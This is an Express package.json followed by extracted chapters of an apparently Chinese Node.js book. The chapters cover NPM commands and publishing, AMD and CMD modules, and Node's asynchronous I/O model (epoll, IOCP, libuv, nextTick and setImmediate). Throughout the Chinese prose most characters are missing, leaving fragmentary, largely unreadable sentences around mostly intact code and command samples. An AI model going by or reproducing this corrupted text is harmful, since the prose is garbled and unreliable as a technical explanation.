{ "name": "express", "description": "Sinatra inspired web development framework", "version": "3.3.4", "author": "TJ Holowaychuk <tj@vision-media.ca>", "contributors": [ 
{ "name": "TJ Holowaychuk", "email": "tj@vision-media.ca" 
 }, 
{ "name": "Aaron Heckmann", "email": "aaron.heckmann+github@gmail.com" 
 }, 
{ "name": "Ciaran Jessup", "email": "ciaranj@gmail.com" 
 }, 
{ "name": "Guillermo Rauch", "email": "rauchg@gmail.com" 
} ], "dependencies": { 
 "connect": "2.8.4",  "commander": "1.2.0",  "range-parser": "0.0.4",  "mkdirp": "0.3.5",  "cookie": "0.1.0",  "buffer-crc32": "0.2.1",  "fresh": "0.1.0",  "methods": "0.0.1",  "send": "0.1.3",  "cookie-signature": "1.0.1",  "debug": "*" 
}, 
"devDependencies": {  "ejs": "*", "mocha": "*",  "jade": "0.30.0",  "hjs": "*", "stylus": "*",  "should": "*",  "connect-redis": "*",  "marked": "*",  "supertest": "0.6.0" 
}, 
"keywords": [ "express", "framework",  "sinatra", "web",  "rest",  "restful", "router",  "app",  "api" 
], "repository": "git://github.com/visionmedia/express", "main": "index", "bin": { 
 "express": "./bin/express" }, "scripts": {
 "prepublish": "npm prune",
 "test": "make test" }, "engines": {
 "node": "*" } } 
2.6.3NPM
CommonJS包是，NPM是中的一实践。NPM之于Node，相于gem之于Ruby，
pear之于PHP。对于Node言，NPM了的发、。NPM，Node与之了很好的一个生系统。
NPM，可以用管包。之外，NPM还有一些的用，下我们一下。
1. 
在Node之后，npm –v可以前NPM的本
$ npm -v 1.2.32 
在不熟悉NPM的之前，可以接NPM到
$ npm 
Usage: npm <command> 
where <command> is one of:  add-user, adduser, apihelp, author, bin, bugs, c, cache, completion, config, ddp, dedupe, deprecate, docs, edit, explore, faq, find, find-dupes, get, help, help-search, home, i, info, init, install, isntall, issues, la, link, list, ll, ln, login, ls, outdated, owner, pack, prefix,
 prune, publish, r, rb, rebuild, remove, restart, rm, root,  run-script, s, se, search, set, show, shrinkwrap, star, stars, start, stop, submodule, tag, test, tst, un,  uninstall, unlink, unpublish, unstar, up, update, version,  view, whoami 
npm <cmd> -h quick help on <cmd> npm -l display full usage info npm faq commonly asked questions npm help <term> search for help on <term> npm help npm involved overview 
Specify configs in the ini-formatted file: 
 /Users/jacksontian/.npmrc or on the command line via: npm <command> --key value Config info can be viewed via: npm help config 
npm@1.2.32 /usr/local/lib/node_modules/npm 可以到，中了有的，中npm help <command>可以的。
2. 
包是NPM最的用，它的语是npm install express。后，NPM会在前目下创node_modules目，后在node_modules目下创express目，接着包解到这个目下。
好包后，接在中用require('express');可入包。require()在做分的时候会过到express在的。入包的这个是相相的。
式
包中有工，要npm install express –g。要的是，并不是一个包为一个包的，它并不着可以从过require()用到它。
这个实并不，在多。实上，-g是一个包为可用的
可。它包中的bin，实脚本接到与Node可相的下
"bin": { "express": "./bin/express" }, 
事实上，过的有包都了一个统一的目下，这个目可以过下推
path.resolve(process.execPath, '..', '..', 'lib', 'node_modules'); 
Node可的是/usr/local/bin/node，目就是/usr/local/lib/node_ 
modules。最后，过接的bin的可接到Node的可目下。
. 
对于一些没有发到NPM上的包，是因为网因接的包，可以过包下到本，后以本。本只为NPMpackage.json在的可它可以是一个包package.json的，也可以是一个URL，也可以是一个目下有package.json的目。数下
npm install <tarball file> npm install <tarball url> npm install <folder> 
. 
不能过源，可以过像源。在时，加--registry=http:// registry.url可，下npm install underscore --registry=http://registry.url 

使用过程中几都用像源，可以以下定认源
npm config set registry http://registry.url 
3. NPM
一个要的是C/C++实上是编后才能使用的。package.json中scripts的就是包在者过程中机，下
"scripts": { "preinstall": "preinstall.js", "install": "install.js", "uninstall": "uninstall.js", "test": "test.js" 
} 
在以上中npm install <package>时，preinstall的脚本会加，后install的脚本会。在npm uninstall <package>时，uninstall的脚本也会做一些工作。
在一个的包目下npm test时，会test的脚本。一个优的包应包测试用，并在package.json中好测试的，用测试用，以包是否定可。
4. 
为了个NPM的程起，这编写一个包，发到NPM中，并过NPM本。
. 
的内我们量，这还是以sayHello作为，相关下
exports.sayHello = function () { return 'Hello, world.'; }; 
这为hello.js可。
始文
package.json的内管相对多，是实发一个包时并不要一一编写。NPM的npm init会你生package.json，下
$ npm init This utility will walk you through creating a package.json file. It only covers the most common items, and tries to guess sane defaults. 
See `npm help json` for definitive documentation on these fields and exactly what they do. 
Use `npm install <pkg> --save` afterwards to install a package and save it as a dependency in the package.json file. 
Press ^C at any time to quit. name: (module) hello_test_jackson version: (0.0.0) 0.0.1 description: A hello world package entry point: (hello.js) ./hello.js test command: git repository: keywords: Hello world author: Jackson Tian license: (BSD) MIT About to write to /Users/jacksontian/git/diveintonode/examples/03/module/package.json: 
{ "name": "hello_test_jackson", "version": "0.0.1", "description": "A hello world package", "main": "./hello.js", "scripts": {
 "test": "echo \"Error: no test specified\" && exit 1" }, "repository": "", "keywords": [
 "Hello", 
 "world" ], "author": "Jackson Tian", "license": "MIT" 
} 
Is this ok? (yes) yes npm WARN package.json hello_test_jackson@0.0.1 No README.md file found! 
NPM过问的个入，最后生的包。你，入yes，时会在目下到package.json。
. 
为了包，NPM要使用才包发到中。的是npm 
adduser。这也是一个问的过程，序可
$ npm adduser Username: (jacksontian) Email: (shyvo1987@gmail.com) 
. 

上包的是npm publish <folder>。在创的package.json在的目下，npm publish .开始上包，相关下
$ npm publish . 
npm http PUT http://registry.npmjs.org/hello_test_jackson 
npm http 201 http://registry.npmjs.org/hello_test_jackson 
npm http GET http://registry.npmjs.org/hello_test_jackson 
npm http 200 http://registry.npmjs.org/hello_test_jackson 
npm http PUT http://registry.npmjs.org/hello_test_jackson/0.0.1/-tag/latest 
npm http 201 http://registry.npmjs.org/hello_test_jackson/0.0.1/-tag/latest 
npm http GET http://registry.npmjs.org/hello_test_jackson 
npm http 200 http://registry.npmjs.org/hello_test_jackson 
npm http PUT 
http://registry.npmjs.org/hello_test_jackson/-/hello_test_jackson-0.0.1.tgz/-rev/2-2d64e0946b86687 
8bb252f182070c1d5 
npm http 201 
http://registry.npmjs.org/hello_test_jackson/-/hello_test_jackson-0.0.1.tgz/-rev/2-2d64e0946b86687 
8bb252f182070c1d5 
+ hello_test_jackson@0.0.1 
在这个过程中，NPM会目包为一个，后上到源中。
. 
为了测试自己上的包，可以一个目npm install hello_test_jackson它
$ npm install hello_test_jackson --registry=http://registry.npmjs.org npm http GET http://registry.npmjs.org/hello_test_jackson npm http 200 http://registry.npmjs.org/hello_test_jackson hello_test_jackson@0.0.1 ./node_modules/hello_test_jackson 
. 
，一个包只有一个人有发。要多人发，可以使用npm owner你管包的有者
$ npm owner ls eventproxy npm http GET https://registry.npmjs.org/eventproxy npm http 200 https://registry.npmjs.org/eventproxy jacksontian <shyvo1987@gmail.com> 
使用这个，也可以加包的有者，一个包的有者
npm owner ls <package name> npm owner add <user> <package name> npm owner rm <user> <package name> 
5. 
在使用NPM的过程中，你不能认前目下能否过require()入想要的包，这时可以npm ls分包。
这个可以为你分前下能过到的有包，并生树，下
$ npm ls /Users/jacksontian  connect@2.0.3  crc@0.1.0   debug@0.6.0  formidable@1.0.9  mime@1.2.4  qs@0.4.2  hello_test_jackson@0.0.1   urllib@0.2.3 
2.6.4NPM 
在的内部应用中使用NPM与开源社区中使用有一定的。的在于，一要享到开发的目组织上的好，一要到性的问题。以，过NPM享发在在的。
为了时能享到NPM上多的包，时对自己的包，有的解决就是自己的NPM。， NPM自是开源的，是它的服务端客端。过源自己的并
不是。NPM的与像（情可D）的几一样。与像不的在于，NPM可以不源中的包。图2-10为
中使用的图。

图2-10使用的图
对于内部言，有的可用可以包到NPM中，这样可以新的中心，不至于个小目自相能的，绝过复实享的为。
2.6.5NPM
作为为包服务的工，NPM分。它实质上已经是一个包享，有人都可以贡献并包分享到这个上，也可以在可（大多是MIT可）的下使用它们。NPM的这些，接到一个享上，了贡献者与使用者之的，这分有于的，也分于Node的推广。几没有一语言有Node这样才3年多就有上个的情景。这个一部分是因为Node了JavaScript，这门语言有极大的开发人数，有强大的生产一部分是因为CommonJS NPM，它们使产品能好组织、使用。
在的问题在于，在NPM上，个人都可以分享包到上，于开发人不一，上的包的质量也不。一个问题是，Node可以在服务端，要问题。
对于包的使用者言，包质量问题要作为是否的一个。
管NPM没有性的一个包的质量，好在开源社区也有它内在的发机，就是应，中NPM页（https://npmjs.org/）上的可以的质量可性。个可以质量的是GitHub，NPM中大多的包都是过GitHub托管的，目的者数量分数量也能从反这个的可性。个可以量包质量的在于包中的测试用的，一个没有测试的包本上是信的，没有的包，使用者使用时内心也是不实的。
在问题上，在经过质量的之后，应可以一大候包。于使用者大多是JavaScript程序，实在于C/C++，这在的部门之后可使用。
事实上，为了解决上问题，Isaac Z. Schlueter入CPAN社区中的Kwalitee自序。Kwalitee是一个，发与quality相。CPAN社区对它的始定下Kwaliteeis somethingthatlooks like quality, sounds like quality, butis notquite quality. 
大就是认一个的质量是否优并不是，只能从一些，都过，也并不能定它就是高质量的。这个能大部分不的，不是有。言，Kwalitee的要的与上的大相。
好的测试。
好的（README、API）。好的测试。好的编。多。CPAN社区定了相多的。，NPM社区也会有多的。
读者可以这些区分些优的的。
2.7
了多后端的实后，在我们CommonJS次到前端上。JavaScript在Node之后，的编程语言多了一优势，就是一些可以在前后端实
用，这是因为很多API在个环境下都。是在实情中，前后端的环境是有
的。
2.7.1
前后端JavaScript分在HTTP的端，它们的并不。端的JavaScript要经从一个服务端分发到多个客端，服务端JavaScript是相的要多次。前者的在于，后者的在于CPU内源。前者要过网加，后者从中加，者的加不在一个数量上。
Node的入过程，几都是的。管与Node强的为有些相反，它是的。是前端也用的入，会在用上很大的问题。UI在初始过程中要很多时脚本加。
于网的因，CommonJS为后端JavaScript定的并不前端的应用场景。经过一之后，AMD最在前端应用场景中。
它的是Asynchronous Module Definition，是定
，https://github.com/amdjs/amdjs-api/wiki/AMD。之外，还有定的CMD。
2.7.2AMD
AMD是CommonJS的一个，它的定下
define(id?, dependencies?, factory); 
它的id是可的，与Node相的在于factory的内就是实的内。下的定了一个的

define(function() { 
var exports = {}; 
exports.sayHello = function() { 
 alert('Hello from module: ' + module.id); 
}; 
return exports; 
}); 
不之在于AMD要用define定一个，在Node实中是包的，它们的目的是作用，仅在要的时候入，过过量者
的，以量不小心。一个区是内要过的实。
2.7.3CMD

CMD由国内的，与AMD的要区在于定入的部分。AMD要在的时候定有的，过到内中

define(['dep1', 'dep2'], function (dep1, dep2) { return function () {}; }); 
与AMD相，CMD接于Node对CommonJS的定
define(factory); 
在
部分，CMD动入，下
define(function(require, exports, module) { // The module code goes here 

}); 
require、exportsmodule过，在要时，时用require()
入可。
2.7.4
为了一个可以在前后端，在写作过程中要前端也实了的环境。为了前后端的一性，开发者要包在一个包内。以下hello()定到不的环境中，它能Node、AMD、CMD以的环境中
;(function (name, definition) { // 检测上文环境是否为AMDCMD var hasDefine = typeof define === 'function', 
 //检查上文环境是否为Node hasExports = typeof module !== 'undefined' && module.exports; 
if (hasDefine) {  // AMD环境CMD环境 define(definition); 
} else if (hasExports) {  //定义为通Node模块 module.exports = definition(); 
} else {  //将模块的执行结在window量中在器中thiswindow对象 this[name] = definition(); 
} 
})('hello', function () { var hello = function () {}; return hello; 
}); 
2.8
CommonJS的分，是实分强大。Node过，组织了自的生，弥补JavaScript性的问题，了定的，并外服务。NPM过对包的，有组织了，这使目开发中的问题到很好的解决，并有了分享的，开源量，使Node的发前有，这对于他后端JavaScript语言实言是从有过的。从一定的上，CommonJSNode了它的。只有的，才能的，并为天大树。是这些的实践，使Node有序发着，过JavaScript解的，性的生系统。
2.9
本的源下
. http://www.commonjs.org 
. http://npmjs.org/doc/README.html 
. http://www.infoq.com/cn/articles/msh-using-npm-manage-node.js-dependence 
. http://nodejs.org/docs/latest/api/modules.html 
. http://addyosmani.com/writing-modular-js/ 
. http://seajs.org/docs/ 
. http://zh.wikipedia.org/zh/JavaScript 
. http://zh.wikipedia.org/wiki/ECMAScript . http://www.ecma-international.org/publications/files/ECMA-ST/Ecma-262.pdf . http://www.w3.org/TR/html5/ . http://arstechnica.com/web/news/2009/12/commonjs-effort-sets-javascript-on-path-for-world-d 
omination.ars . http://cnodejs.org/topic/4f16442ccae1f4aa270010d7 . http://wiki.commonjs.org/wiki/Packages/1.0 

. http://npmjs.org/doc/developers.html#The-package-json-File

I/O  
第章 



在1中，我们过I/O。这个实很就生了，它的大是在Web 2.0中，它着AJAX的一个A（Asynchronous）了Web。Node在之前，最习编程的程序过于前端工程了。前端编程GUI编程的一，中了Ajax事，这些都是的应用场景。
事实上，就在于作系统的。在系统中，过信量、有了广的应用。外的是，在绝大多数高编程语言中，并不多，了一。这个的要因也人程序不过程序。
PHP这门语言的最能这个。它对用不仅了，甚至多线程都不。PHP语言从到脚都是以的的
。它的优分，于程序序编写务它的在小中本不在，是在复杂的网应用中，它好并发。
在他语言中，管可能在的API，是程序还是习用的编写应用。在多高编程语言中，作为要编程的，Node是个。
着I/O的还有事驱动线程，它们Node的，RyanDahl是于这几个因了Node。Ryan Dahl最初一个高性能的Web服务，后为一个可以于它高、可网应用的，因为一个Web服务已经它的能了。管它不是一个服务，是可以于它多、强大的网应用。
与Node的事驱动、I/O相的一个产品为Nginx。
Nginx用C编写，性能优。它们的区在于，Nginx客端管接的强大能，是它的后于的编程语言。Node是的，可以作为服务端客端的大量并发请，也能作为客端网中的个应用并发请。
Web的是网，Node的就它的一样，是网中灵活的一个。
3.1I/O 
关于I/O为在Node要，这与Node网不关系
。Web应用已经不是服务就能的时了，在网的下，并发已经是编程中的了。到实，可以从用源分这个起。
3.1.1
的之以在Web 2.0中起，是因为在中JavaScript在线程上，且它还与UI用一个线程。这着JavaScript在的时候UI应是于的。高性能JavaScript一书中经过，脚本的时过100，用就会到页，以为网页应。在B/S中，网的网页的实时很大的。网页时要一个网源，过的，JavaScript要源从服务端后才能继续，这UI，不应用的为。可以想，这样的用会多。用请，在下源，JavaScriptUI的都不会于，可以继续应用的为，用一个活的页。
，前端过可以UI的，是前端源的也决于后端的应。一个源自于个不的数的，一个源要M 的时，个源要N的时。用的，大下
//时间为M getData('from_db'); //时间为N getData('from_remote_api'); 
是用，一个源的并不会个源，也个源的请并不一个源的。，我们可以享到并发的优势，相关下
getData('from_db', function (result) { 
// 时间为M 
}); 
getData('from_remote_api', function (result) { 
// 时间为N 
}); 
对者的时，前者为M+N，后者为max（M, N）。
着应用复杂性的加，情景会M+ N+ max（M, N, ），与的优会。一，着网应用不，数会分到多服务上，分会是
。分也着M与N的会线性，这也会大在性能的。为了读者到MN多，3-1了从CPU一到网的数问要的开。
3-1I/O
I/O CPU 
CPU一 3  
CPU 14  
内 250  
 41000000  
网 240000000  

这就是I/O在Node中，甚至作为要的因。I/O的
式I/O的。
只有后端能应源，才能前端的好。
3.1.2
用的因，我们从源分的分一下I/O的要性。我们机在发过程中组了，分为I/O。
务场景中有一组不相关的务要，的有以下。
线程次。
多线程并。

创多线程的开小于并，多线程的是的。多线程的在于创
线程线程上下的开大。外，在复杂的务中，多线程编程经、问题，这是多线程的要因。是多线程在多CPU上能有CPU的用，这个优势是的。
线程序务的编程人序的。它是最的编程，因为它于。是的在于性能，一个的务都会后续。在机源中，I/O与CPU之是可以并的。
是的编程的问题是，I/O的会后续务，这源不能好用。
作系统会CPU的时分余程，以有用源，于这一，有的
服务为了应能，会过动多个工作程为多的用服务。是对于这一组务言，它分发务到多个程上，以高用源，有务的时会。这于加服务，到用多源服务，它并没能问题。
加源是一服务质量的，它不是一的。线程编程会因I/O源不到优的使用。多线程编程也因为编程中的、问题开发人。Node在者之了它的用线程，多线程、问题
用I/O，线程，以好使用CPU。
I/O可以作Node的，因为它是个大I/O应用在应用上的，它在线程上源分高。为了弥补线程用多CPU的，Node了前端中Web Workers的程，程可以过工作程高用CPUI/
O。这部分内在9中。I/O的是I/O的用不后续，有I/O的这时分余要的务。图3-1为I/O的用图。

图3-1 I/O的用图
3.2I/O 
I/O在Node中应用最为广，是它并Node的创。BrendanEich18国学，它的优之并创，它的创之
并不优，以之他自己创的JavaScript一样，Node的优之也并创。下我们作系统对I/O实的。
3.2.1I/OI/O 
在到Node的时，我们时会到、、、事这些语在一起推-，中与起是一事。从实言，都到了我们并I/O的目的。是从机内I/O言，//实上是事。
作系统内对于I/O只有与
。在用I/O时，应用程序要I/O才，图3-2。
I/O的一个是用之后一定要到系统内有作后，用才
。以读上的一为，系统内在、读数、复数到内中之后
，这个用才。
I/OCPUI/O，时，CPU的能不能到分用。为了高性能，内了I/O。I/OI/O的为用之后会立
，图3-3。

图3-2用I/O的过程
有文。文I/O文
文的

。I/O文据文文的数据。I/OI/O的区I/O数据的I/O数据数据文。

图3-3用I/O的过程
I/O之后，CPU的时可以用他事务，时的性能是的。
I/O也在一些问题。由于的I/O并没有，立的并不是务的
数，仅仅是前用的。为了的数，应用程序要复用I/O作认
是否。这复用作是否的技术做
，下我们就要这技术。
技术都并的。I/OCPU，的是要认是否数，它会CPU，是对CPU源的。这我们且技术是的，以小I/O的CPU。
的技术要有以下这些。
. read。它是最始、性能最的一，过复用I/O的数的读。在到最数前，CPU一用在上。图3-4为过read的图。

图3-4 过read的图
. select。它是在read的上的一，过对上的事。图3-5为过select的图。

图3-5 过select的图
select有一个的，就是由于它用一个1024的数组，以它最多可以时1024个。
. poll。select有，用的数组的，次它能不要的。是多的时候，它的性能还是分下的。图3-6为过poll实的图，它与select相，性能有。

图3-6 过poll实的图
. epoll。是Linux下最高的I/O事机，在入的时候没有到I/O事，会，到事发生它。它是实用了事、
的，不是遍，以不会CPU，高。图3-7为过epoll实的图。

图3-7 过epoll实的图
. kqueue。的实与epoll，不过它仅在FreeBSD系统下在。
技术了I/O数的，是对于应用程序言，它只能是一，因为应用程序要I/O，了很多时。，CPU要用于遍的，要用于事发生。是它不好。
3.2.2I/O 
管epoll已经用了事CPU的用，是CPU几是的，对于前线程言用不。，是否有一想的I/O
我们的的I/O应是应用程序发起用，过遍者事，可以接下一个务，只在I/O后过信数应用程序可。图3-8为想中的I/O图。

图3-8想中的I/O图
的是，在Linux下在这样一，它生的一I/O（AIO）就是过信数的。
不的是，只有Linux下有，且它还有AIO仅内I/O中的O_DIRECT读，用系统。
3.2.3I/O 
实想要一些，是要I/O的目，并事。前我们场景定在了线程的下，多线程的会是一景。过部分线程I/O者I/O加
技术数，一个线程，过线程之的信I/O到的数
，这就实了I/O
（管它是的），图图3-9。

图3-9 I/O 
glibc的AIO是的线程I/O。的是，它在一些以的bug，不推荐用。libev的作者MarcAlexanderLehmann新实了一个I/O的libeio。libeio实质上是用线程与I/OI/O。最初，Node在*nix下用了libeiolibev实I/O部分，实了I/O。在Nodev0.9.3中，自实了线程I/O。
一我没有的I/O是Windows下的IOCP，它在程上了想的I/O用，I/O之后的，，用。是它的
内部实是线程，不之在于这些线程由系统内接管。

IOCP的I/O与Node的用分。在Windows下用了IOCP实I/O。
由于Windows*nix的，Node了libuv作为，使有性的都由这一，并上的Node与下的自定线程IOCP之自立。Node在编会，性编unix目是win目下的源到目程序中，图3-10。

图3-10 于libuv的图要强一的是，这的I/O不仅仅只于的读写。*nix机了一，
、、接几有机源都为了，因这的的情样能于接。
一个要强的在于我们时到Node是线程的，这的线程仅仅只是JavaScript在线程中了。在Node中，是*nix还是Windows，内部I/O务的有线程。
3.3Node I/O
系统对I/O的后，我们继续Node是实I/O的。这我们了I/O的实外，还Node的。个I/O环的有事环、者
请对。
3.3.1
，我们着强一下Node自的事，
是它使数分遍。
在程动时，Node会创一个于while(true)的环，一次环的过程我们为Tick。个Tick的过程就是是否有事，有，就事相关的数。在关的数，就它们。后入下个环，不有事，就程。程图图3-11。

图3-11 Tick程图
3.3.2
在个Tick的过程中，是否有事要这要入的是。
3.3Node的I/O57 
个事环中有一个者多个者，是否有事要的过程就是这些者问
是否有要的事。
这个过程就的，一一作，是要作些决于收收到的客人的下。做一，就问收的小，接下有没有要做的，没有的，就下了。在这个过程中，收的小就是者，收到的客人就
是关的数。
，经有，它可能有多个收，就事环中有多个者一样。收到下就是一个事，一个者可能有多个事。
用了的机。事可能自用的者加些时产生，这些产生的事都有对应的者。在Node中，事要源于网请、I/O，这些事对应的者有I/O者、网I/O者。者事了分。
事环是一个的/。I/O、网请是事的生产者
，源源不为Node不的事，这些事到对应的者，事环从者事并。
在Windows下，这个环于IOCP创，在*nix下于多线程创。
3.3.3
在这一中，我们过解Windows下I/O（用IOCP实）的探从JavaScript到系统内之都发生了。
对于一的（）数，数由我们自用，下
var forEach = function (list, callback) { for (var i = 0; i < list.length; i++) {  callback(list[i], i, list); } }; 
对于Node中的I/O用言，数不由开发者用。从我们发用后，到数，中发生了事实上，从JavaScript发起用到内I/O作的
过过程中，在一中产，它做。
下我们以最的fs.open()作为，探索Node与之是I/O用以数是用的
fs.open = function(path, flags, mode, callback) { 
// ... 
binding.open(pathModule._makeLong(path), 
 stringToFlags(flags), 
 mode, 
 callback); 
}; 
fs.open()的作用是定数开一个，从到一个，这是后续有I/O作的初始作。从前的中可以到，JavaScrip
t的过用C++心下的作。图3-12为用图。

图3-12用图
从JavaScript用Node的心，心用C++内，内过libuv系
统用，这是Node经的用。这libuv作为，有个的实，实质上是用了uv_fs_open()。在uv_fs_open()的用过程中，我们创了一个FSReqWrap请对。从JavaScript入的数前都在这个请对中，中我们最为关的数在这个对的oncomplete_sym性上
req_wrap->object_->Set(oncomplete_sym, callback); 
对包后，在Windows下，用QueueUserWorkItem()这个FSReqWrap对推入
线程中，的下 
QueueUserWorkItem(&uv_fs_thread_proc,  req,  WT_EXECUTEDEFAULT)  \ \  

QueueUserWorkItem()接3个数一个数是要的的用，这用的是uv_fs_thread_proc，个数是uv_fs_thread_proc时要的数个数是的。线程中有可用线程时，我们会用uv_fs_thread_proc()。uv_fs_thread_ proc()会入数的用相应的数。以uv_fs_open()为，实上用fs__open()。
至，JavaScript用立，由JavaScript发起的用的一就。JavaScript线程可以继续前务的后续作。前的I/O作在线程中，不管它是否I/O，都不会到JavaScript线程的后续，就到了的目的。
3.3Node的I/O59 
请对是I/O过程中的要中产，有的都在这个对中，包括入线程以I/O作后的。
3.3.4
组好请对、入I/O线程，实上了I/O的一部分，是部分。
线程中的I/O作用之后，会的在req->result性上，后用PostQueuedCompletionStatus()IOCP，前对作已经
PostQueuedCompletionStatus((loop)->iocp, 0, 0, &((req)->overlapped)) 
PostQueuedCompletionStatus()的作用是IOCP，并线程还线程。过PostQueuedCompletionStatus()的，可以过GetQueuedCompletionStatus()。
在这个过程中，我们实还动用了事环的I/O者。在次Tick的中，它会用IOCP相关的GetQueuedCompletionStatus()线程中是否有的请，在，会请对加入到I/O者的中，后做事。
I/O者数的为就是请对的result性作为数，oncomplete_sym性作为，后用，以到用JavaScript中入的数的目的。
至，个I/O的程，图3-13。

图3-13个I/O的程
事环、者、请对、I/O线程这者了NodeI/O的本要
。
Windows下要过IOCP系统内发I/O用从内已的I/O作，以事环，以I/O的过程。在Linux下过epoll实这个过程，FreeBSD下过kqueue实，Solaris下过Event ports实。不的是线程在Windows下由内（IOCP）接，*nix系下由libuv自实。
3.3.5
从前实I/O的过程中，我们可以I/O的几个关线程、事环、者I/O线程。这线程与I/O线程之起有些的样。由于我们JavaScript是线程的，以识很解为它不能分用多CPU。事实上，在Node中，了JavaScript是线程外，Node自实是多线程的，只是I/O线程使用的CPU。一个要的是，了用并外，有的I/O（I/O网I/O）是可以并起的。
3.4I/O API 
管我们在Node的时候，多数情下都会到I/O，是Node中实还在一些与I/O关的API，这一部分也关一下，它们分是setTimeout()、setInterval()、
setImmediate()process.nextTick()。
3.4.1
setTimeout()setInterval()与中的API是一的，分用于次多次定时务。它们的实与I/O，只是不要I/O线程的与。用setTimeout()者
setInterval()创的定时会入到定时者内部的一个树中。次Tick时，会从树中定时对，是否过定时时，过，就一个事，它的数立。
图3-14到的要是setTimeout()的为。setInterval()与之相，区在于后者是复性的测。
定时的问题在于，它并的（在内）。管事环分，是一次环用的时多，下次环时，它也已经时很了。过setTimeout()定一个务在10后，是在9后，有一个务用了5的CPU时，次到定时时，时就已经过4。
3.4I/O的API61 

图3-14 setTimeout()的为
3.4.2process.nextTick()
在了解process.nextTick()之前，很多人也为了立一个务，会这样用setTimeout()到的
setTimeout(function () { // TODO }, 0); 
由于事环自的，定时的不。事实上，用定时要动用树，创定时对作，setTimeout(fn, 0)的为性能。实上，process.nextTick()的作相对为量
，下
process.nextTick = function(callback) { // on the way out, don't bother. // it won't get fired anyway if (process._exiting) return; 
if (tickDepth >= process.maxTickDepth)  maxTickWarn(); 
var tock = { callback: callback }; if (process.domain) tock.domain = process.domain; nextTickQueue.push(tock); if (nextTickQueue.length) {
 process._needTickCallback(); } }; 
次用process.nextTick()，只会数入中，在下一Tick时。定时中用树的作时复杂为O(lg(n))，nextTick()的时复杂为O(1)。相之下，process.nextTick()高。
3.4.3setImmediate() 
setImmediate()与process.nextTick()分，都是数。在Node v0.9.1之前，setImmediate()还没有实，时候实的能要是过process.nextTick()，的下
process.nextTick(function () { 
console.log('执行'); }); console.log('正常执行'); 
上的下
正常执行执行
用setImmediate()实时，相关下
setImmediate(function () { 
console.log('执行'); }); console.log('正常执行'); 
一样
正常执行执行
是者之实是有的。它们在一起时，会是样的优。下
process.nextTick(function () { 
console.log('nextTick执行'); }); setImmediate(function () { 
console.log('setImmediate执行'); }); console.log('正常执行'); 
下
正常执行nextTick执行setImmediate执行
从可以到，process.nextTick()中的数的优要高于setImmediate()。这的因在于事环对者的是有后序的，process.nextTick()于idle者，setImmediate()于check者。在一个环中，idle者于I/O者，I/O者于check者。
在实上，process.nextTick()的数在一个数组中，setImmediate()的是在中。在为上，process.nextTick()在环中会数组中的数部，setImmediate()在环中中的一个数。下的可以
//加入nextTick()的回调函数process.nextTick(function () { 
console.log('nextTick执行1'); }); process.nextTick(function () { 
console.log('nextTick执行2'); 
}); 3 
//加入setImmediate()的回调函数
setImmediate(function () { console.log('setImmediate执行1'); // 进入循环process.nextTick(function () { 
 console.log('势入'); 
}); }); setImmediate(function () { 
console.log('setImmediate执行2'); }); console.log('正常执行'); 
下
正常执行nextTick执行1 nextTick执行2 setImmediate执行1 势入setImmediate执行2 
从上可以，一个setImmediate()的数后，并没有立个，是入了下一环，次process.nextTick()优、setImmediate()次后的序。之以这样，是为了环能，CPU用过多后续I/O用的情。
3.5
前要了的实，在这个过程中，我们也本了事驱动的实质，
过环加事触发的程序。
管本只用了fs.open()作为Node实I/O。实质上，I/O不仅仅应用在作中。对于网接的，Node也应用到了I/O，网接上到的请都会事I/O者。事环会不这些网I/O事。JavaScript有入数，这些事会最到务。用NodeWeb服务，是在这样一个上实的，程图图3-15。

图3-15 用NodeWeb服务的程图
下为几经的服务，这对下它们的优。. 对于的服务，一次只能一个请，并且余请都于。. /为个请动一个程，这样可以多个请，是它不
性，因为系统源只有多。. /为个请动一个线程。管线程程要量，是由于个线程都用一定内，大并发请到时，内会很用，服务
。
线程/请的性程/请的要好，对于大言不。
线程/请的目前还Apache用。Node过事驱动的请，为
一个请创外的对应线程，可以创线程线程的开，时作系统在务时因为线程，上下的很。这使服务能有不请，使在大量接的情下，也不线程上下开的，这是Node高性能的一个因。
事驱动的高已经开始为。服务Nginx，也了多线程的，用了Node相的事驱动。今，Nginx大有Apache之势。Node有与Nginx相的性，不之在于Nginx用C写，性能高，是它仅于做Web服务
，用于反服
务，在务为。Node是一高性能的，可以用它与Nginx相的能，也可以务，且与后的网。者相，Node没有Nginx在Web服务，场景大，自性能也不。在实目中，我们可以它们自优，以到应用的最优性能。
事实上，Node的I/O并创，是一个的。在之前，也有一些的于事驱动的实，下。
. Ruby的Event Machine。
. Perl的AnyEvent。
. Python的Twisted。

在这些上用事驱动的时，要一定了解这些。这些没能的因是I/O的在。本的I/O实，是使I/O作与CPU作分。这些语言上的I/O都是的，一事环中在I/O，余I/O立，性能会下，于服务，他请不能立。
因为在这些熟的语言上，不是，管有这些事驱动的实，开发者会习性用I/O，这想的高性能接。RyanDahl在他最的时，Lua一是最他的语言，是由于I/O是I/O，他使这样一个事驱动的实，也不会到大的使用。在Node广之后，社区的Tim CaswellNode的这想新到了Lua，目luavit。
JavaScript中的作用数在端已有熟的应用，也很好了Ryan Dahl实它的想。JavaScript在服务端，使Node没有包，Node在性能上的使它一下就在社区中起了。
3.6
本了I/O一些I/O的。可以，事环是实的心，它与中的本了一。像的Rhino，管是就能在服务端的JavaScript时，是并不像用事驱动，是像他语言一用I/O作为要，这它在性能上发。Node是了一的高性能I/O，了JavaScript在服务端不前的。
3.7
本的源下
. http://cnodejs.org/blog/?p=244 
. http://cnodejs.org/blog/?p=2426 
. http://cnodejs.org/blog/?p=2489 
. http://nodejs.org/nodeconf.pdf . http://blog.dccmx.com/2011/04/select-poll-epoll-in-kernel/ 
. http://www.ibm.com/developerworks/cn/linux/l-async/ 
. http://twistedmatrix.com/trac/ 
. http://luvit.io/ . http://forum.nginx.org/read.php?2,113524,113587#msg-113587 

 
第章 



有I/O，有编程。
上一了Node过事环实，包括与I/O多复用实的I/O以与I/O关的。Node是个大到应用的，它从内在机到API的，不的。的高性能为它了高的，编程也为部分的。
前中过I/O在应用不的因，是编程在程中，务并不自语言的线性习。人能应接对事驱动编程，对它熟悉的要是GUI开发者，前端工程GUI工程。前端工程习以为并能熟DOM事中的事。RyanDahl好事驱动，Java Script在中也事驱动的过程，这也使前后端的JavaScript在上都于一。语言在不的环境，了的API有不外，并不人是一门新语言。
V8I/O在性能上的，前后端JavaScript编程一，是Node能并起的要因。
4.1
